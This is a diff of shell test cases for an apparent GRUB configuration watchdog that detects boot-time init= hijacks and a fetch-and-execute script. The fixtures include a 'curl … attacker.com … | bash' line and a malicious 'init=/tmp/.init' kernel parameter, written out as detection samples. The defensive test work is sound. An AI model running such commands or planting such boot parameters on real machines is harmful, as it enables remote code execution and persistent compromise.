@@ -201,3 +201,36 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-grub-config -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): grub-config-watchdog does NOT refresh baseline on injection/init= detection — alert STAYS until operator updates" {
+    # T1542/T1037 boot-time PID-1 hijack — alert MUST persist across
+    # runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet init=/tmp/.init"\n' > "${DEFAULT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented init= NOT flagged: # prefix filtered)" {
+    # /etc/default/grub uses # for comments. Operator notes about
+    # hypothetical bad init= must NOT trigger alert.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'GRUB_TIMEOUT=5\n# GRUB_CMDLINE_LINUX="quiet init=/tmp/.example-init"\nGRUB_CMDLINE_LINUX="quiet splash"\n' > "${DEFAULT}"
+    run_wd
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${SCRIPT}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
